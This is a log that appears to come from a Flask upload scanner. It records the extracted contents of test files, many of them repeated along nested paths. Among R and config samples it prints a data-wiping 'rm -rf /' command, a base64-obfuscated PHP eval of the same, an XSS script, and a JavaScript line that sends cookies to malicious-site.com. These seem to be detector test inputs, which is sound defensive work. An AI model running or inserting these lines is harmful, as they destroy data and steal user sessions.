2025-02-22 20:38:37,529 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,539 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,540 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,541 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,544 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,545 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,547 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,548 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,549 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,550 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,551 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,552 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,553 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,559 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,560 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,562 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,566 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,568 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,572 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,574 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,576 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,577 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,578 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,580 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,581 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,588 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,589 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,590 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:37,593 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:37,594 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:37,596 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:37,598 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,599 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,600 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,601 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,602 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,603 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:37,609 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,610 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:37,611 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,612 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,613 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,614 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,615 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,616 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,617 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,618 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,620 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,621 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,622 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,623 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,624 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,625 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,626 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,627 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,628 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,629 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,630 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,632 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,633 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,634 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,635 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,636 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,638 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,639 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,640 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,643 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,644 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,645 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,646 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,647 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,649 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,650 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,651 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,652 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:37,653 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:37,655 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:37,656 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:37,657 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:37,659 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:37,661 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:37,662 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:37,665 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,111 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,116 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,117 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,120 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,121 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,123 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,124 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,125 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,127 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,128 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,133 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,135 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,136 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,139 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,140 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
